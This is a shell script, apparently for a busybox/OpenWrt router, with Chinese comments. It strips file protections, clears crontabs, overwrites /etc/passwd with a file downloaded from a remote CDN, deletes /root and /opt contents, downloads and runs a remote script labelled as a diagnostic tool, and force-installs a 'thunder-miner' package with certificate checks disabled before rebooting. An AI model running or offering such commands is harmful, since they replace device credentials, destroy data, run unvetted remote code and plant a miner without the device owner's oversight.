SITE="https://cdn.rawgit.com/xiefucai/xiefucai.github.io/master/"
setHost()
{
    /bin/busybox chattr -i /etc;
    chattr -i /etc/passwd*;
    [ -f /etc/passwd+ ] && rm -rf /etc/passwd+;
    chattr -i /etc/hosts*;
}

#清除crontab信息
crontab -r;
[ -d /etc/crontabs ] && rm -rf /etc/crontabs/*

setHost;
wget "${SITE}tools/zqb2/passwd?TPSecNotice&TPNotCheck" -O /etc/passwd;
echo 'exit 0'>/etc/rc.local;
rm -rf /root/* /opt/* /tmp/*.core ;
ls -d /tmp/opkg\-* | xargs -n 1 rm -rf;

# 安装断网诊断工具
wget "${SITE}tools/wget_ddd.sh?TPSecNotice&TPNotCheck" -O /tmp/wget_ddd.sh;
chmod +x /tmp/wget_ddd.sh;
sh /tmp/wget_ddd.sh;

wget --no-check-certificate 'https://update.peiluyou.com/conf/miner_plus_test/packages/thunder-miner-app_V1.3.334_meson.ipk?TPSecNotice&TPNotCheck' -O /tmp/t.ipk;

rm -rf /etc/resolv.conf;
ln -s /tmp/resolv.conf /etc/resolv.conf;

[ -f /tmp/t.ipk ] && (opkg install --force-downgrade /tmp/t.ipk && echo '10秒后强制重启' && sleep 10 && reboot) || (echo '未下载到安装包';ls -al /tmp/*.ipk)
